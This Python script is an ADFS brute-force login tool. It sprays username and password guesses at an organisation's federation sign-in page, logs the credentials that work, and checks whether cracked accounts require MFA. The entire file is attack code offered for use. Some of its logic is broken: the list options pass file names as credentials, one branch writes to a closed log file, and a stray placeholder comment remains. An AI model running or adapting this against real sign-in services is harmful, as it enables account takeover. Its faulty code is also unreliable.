import requests
import argparse
import re
import html
from colorama import Fore, Style

def check_response_content(response_content):
    wresult_pattern = r'<input type="hidden" name="wresult" value="([^"]+)" \/>'
    wresult_match = re.search(wresult_pattern, response_content, re.DOTALL)
    
    if wresult_match:
        wresult_value = wresult_match.group(1)
        wresult_value = html.unescape(wresult_value)
        return wresult_value
    else:
        return None

def send_request(target, username, password, verbose=False, log_file=None, check_mfa=False):
    print(f"{Fore.WHITE}[*] Trying login for {username}{Style.RESET_ALL}", end="\r")

    payload = {
        "UserName": username,
        "Password": password,
        "AuthMethod": "FormsAuthentication",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }

    try:
        with requests.Session() as session:
            adfs_login_response = session.post(
                f"{target}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={username}",
                data=payload,
                headers=headers,
                timeout=10
            )
            adfs_login_response.raise_for_status()

            if "action=\"https://login.microsoftonline.com:443/login.srf\"" in adfs_login_response.text:
                success_message = f"[+] Login success: {username} : {password}"
                print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(success_message + "\n")

                if check_mfa:
                    wresult_value = check_response_content(adfs_login_response.text)
                    if wresult_value:
                        login_srf_url = "https://login.microsoftonline.com/login.srf"
                        login_srf_payload = {
                            "wa": "wsignin1.0",
                            "wresult": wresult_value
                        }
                        login_srf_response = session.post(login_srf_url, data=login_srf_payload, headers=headers, timeout=10)
                        login_srf_response.raise_for_status()
                        # TODO: We should probably do a better check here
                        if not "BeginAuth" in login_srf_response.text:
                            mfa_message = f"[+] MFA is not required for: {username}"
                            print(f"{Fore.GREEN}{mfa_message}{Style.RESET_ALL}")
                            if log_file:
                                log.write(mfa_message + "\n")
                        elif "BeginAuth" in login_srf_response.text:
                            mfa_message = f"[-] MFA is required for: {username}"
                            print(f"{Fore.YELLOW}{mfa_message}{Style.RESET_ALL}")
                            if log_file:
                                log.write(mfa_message + "\n")
                    else:
                        print(f"{Fore.RED}[!] Required data not found in the response.{Style.RESET_ALL}")
            elif verbose:
                failure_message = f"[-] Login failed: {username} : {password}"
                print(f"{Fore.RED}{failure_message}{Style.RESET_ALL}")
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(failure_message + "\n")

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[!] HTTP Error occurred: {e}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")

# ... (previous code)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ADFS Brute-Force Login Script",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Usage examples:"
               "\n  python script.py -t https://adfs.example.com -u user -p password123"
               "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123"
               "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt"
               "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt"
               "\n\nExplanation of flags:"
               "\n  -t, --target [url]: ADFS target host URL (e.g., https://adfs.example.com)"
               "\n  -u, --username [user]: Single username to try"
               "\n  -U, --username-list [file]: File containing a list of usernames"
               "\n  -p, --password [pass]: Single password to use for login attempts"
               "\n  -P, --password-list [file]: File containing a list of passwords"
               "\n  --mfa: Check if Multi-Factor Authentication (MFA) is required after successful login"
               "\n  -v: Enable verbose mode"
               "\n  -l [file]: File to log the login results"
               "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n"
    )

    parser.add_argument(
        "-t", "--target", type=str, required=True,
        help="ADFS target host URL (e.g., https://adfs.example.com)"
    )
    parser.add_argument(
        "-u", "--username", type=str, required=False,
        help="Single username to try"
    )
    parser.add_argument(
        "-U", "--username-list", type=str, required=False,
        help="File containing a list of usernames"
    )
    parser.add_argument(
        "-p", "--password", type=str, required=False,
        help="Single password to use for login attempts"
    )
    parser.add_argument(
        "-P", "--password-list", type=str, required=False,
        help="File containing a list of passwords"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", default=False,
        help="Enable verbose mode to show all print statements"
    )
    parser.add_argument(
        "-l", "--log-file", type=str, required=False,
        help="File to log the login results"
    )
    parser.add_argument(
        "--mfa", action="store_true",
        help="Check if Multi-Factor Authentication (MFA) is required after successful login"
    )

    args = parser.parse_args()

    target = args.target
    username = args.username
    username_list_file = args.username_list
    password = args.password
    password_list_file = args.password_list
    verbose = args.verbose
    log_file = args.log_file
    check_mfa = args.mfa

    print(f"{Fore.CYAN}[*] Target ADFS Host: {target}{Style.RESET_ALL}")

    if username and password:
        send_request(target, username, password, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
    elif username and password_list_file:
        send_request(target, username, password_list_file, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
    elif username_list_file and password:
        send_request(target, username_list_file, password, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
    elif username_list_file and password_list_file:
        send_request(target, username_list_file, password_list_file, verbose=verbose, log_file=log_file, check_mfa=check_mfa)
    else:
        print(f"{Fore.RED}[!] Invalid combination of username and password options.{Style.RESET_ALL}")
